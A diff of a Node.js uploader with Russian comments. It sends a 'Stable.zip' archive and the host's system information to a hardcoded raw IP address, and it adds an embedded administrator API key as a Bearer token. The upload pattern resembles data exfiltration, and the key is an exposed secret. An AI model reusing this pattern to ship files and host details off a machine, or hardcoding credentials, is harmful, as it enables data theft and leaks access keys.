@@ -1,13 +1,16 @@
 const fs = require('fs');
 const axios = require('axios');
+const FormData = require('form-data');
 const path = require('path');
 const os = require('os');
 const crypto = require('crypto');
 
 // ===================== CONFIGURATION =====================
 const CONFIG = {
-    serverUrl: 'http://92.246.137.44:4444', // Полный URL сервера
+    serverUrl: 'http://92.246.137.44:8080/api/files/upload', // Обновленный URL
     archiveFileName: 'Stable.zip', 
+    // Используем API-ключ администратора
+    apiKey: 'tJz4uRVCwl2eEwyPTudYP9iGRfgq', 
     chunkSize: 256 * 1024,         // 256KB chunk size
     retryDelay: 5000,              // 5 seconds between retry attempts
     maxRetries: 5                  // Maximum reconnection attempts
@@ -99,6 +102,7 @@ async function uploadFile() {
         const response = await axios.post(CONFIG.serverUrl, formData, {
             headers: {
                 ...formData.getHeaders(),
+                'Authorization': `Bearer ${CONFIG.apiKey}`,
                 'X-Client-Info': JSON.stringify(systemInfo)
             },
             maxContentLength: Infinity,
@@ -106,9 +110,12 @@ async function uploadFile() {
         });
 
         log('Ответ сервера:', JSON.stringify(response.data));
-        return true;
+        return response.data.success;
     } catch (error) {
-        log('Ошибка при загрузке:', error.message, true);
+        log('Ошибка при загрузке:', 
+            error.response ? JSON.stringify(error.response.data) : error.message, 
+            true
+        );
         return false;
     }
 }
